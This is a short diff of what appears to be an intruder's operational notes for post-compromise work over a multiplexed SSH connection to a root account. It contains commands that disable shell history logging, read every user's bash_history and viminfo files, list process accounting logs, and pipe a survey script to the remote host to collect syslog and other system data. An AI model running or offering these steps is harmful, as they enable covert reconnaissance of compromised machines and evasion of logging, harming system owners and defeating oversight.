@@ -17,6 +17,9 @@ script termscreen.$$
 script termscreen.$$
 
 ssh -v -x -M -f -N -o ControlPath=/tmp/hop-1 root@1.1.1.1
+
+ssh -o ControlPath=/tmp/hop-1 root@1.1.1.1 ls -latr /var/account/pacct
+
 ssh -o ControlPath=/tmp/hop-1 root@1.1.1.1
 
 unset HISTFILE HISTFILESIZE HISTSIZE 
@@ -45,7 +48,7 @@ cat /home/*/.bash_history
 cat /root/.viminfo
 cat /home/*/.viminfo
 
-cat ./survey.sh | ssh -o ControlPath=/tmp/hop-1 root@1.1.1.1 | survey-<ip>
+cat ./survey.sh | ssh -o ControlPath=/tmp/hop-1 root@1.1.1.1 > survey-<ip>
 
 Ran the following commands in survey.sh script
 cat /etc/*syslog*
